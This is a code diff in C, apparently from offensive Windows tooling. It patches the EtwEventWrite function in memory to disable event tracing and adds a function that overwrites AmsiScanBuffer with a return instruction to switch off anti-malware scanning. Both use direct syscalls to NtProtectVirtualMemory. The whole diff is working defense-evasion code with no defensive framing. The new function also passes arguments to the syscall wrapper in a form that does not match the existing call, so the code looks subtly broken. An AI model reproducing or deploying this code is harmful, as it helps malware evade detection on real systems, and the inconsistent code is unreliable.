@@ -160,14 +160,12 @@ BOOL EtwPatch() {
     g_ssn = getSSN("NtProtectVirtualMemory");
     g_syscall = getSyscallAddr("NtProtectVirtualMemory");
 
-    con_printf("[ETW] start\n");
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll) return 0;
 
     PVOID pEtwAddr = manual_procaddress(hNtdll, "EtwEventWrite");
     if (!pEtwAddr) return 0;
 
-    con_printf("[ETW] patching\n");
     SIZE_T region = 1;
     ULONG old = 0;
     if (!iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, PAGE_EXECUTE_READWRITE, &old)) {
@@ -175,6 +173,26 @@ BOOL EtwPatch() {
         iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, old, &old);
         FlushInstructionCache(GetCurrentProcess(), pEtwAddr, 1);
         con_printf("[x] ETW Patched!\n");
+        return 1;
+    }
+    return 0;
+}
+
+BOOL AmsiPatch() {
+    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
+    if (!hAmsi) {
+        con_printf("[x] AMSI not loaded\n");
+        return 1;  // silent skip
+    }
+    PVOID pAddr = manual_procaddress(hAmsi, "AmsiScanBuffer");
+    if (!pAddr) return 0;
+
+    DWORD old = 0;
+    if (iNtProtectVirtualMemory(GetCurrentProcess(), pAddr, 1, PAGE_EXECUTE_READWRITE, &old)) {
+        *(BYTE*)pAddr = 0xC3;
+        iNtProtectVirtualMemory(GetCurrentProcess(),pAddr, 1, old, &old);
+        FlushInstructionCache(GetCurrentProcess(), pAddr, 1);
+        con_printf("[x] AMSI Patched!\n");
         return 1;
     }
     return 0;
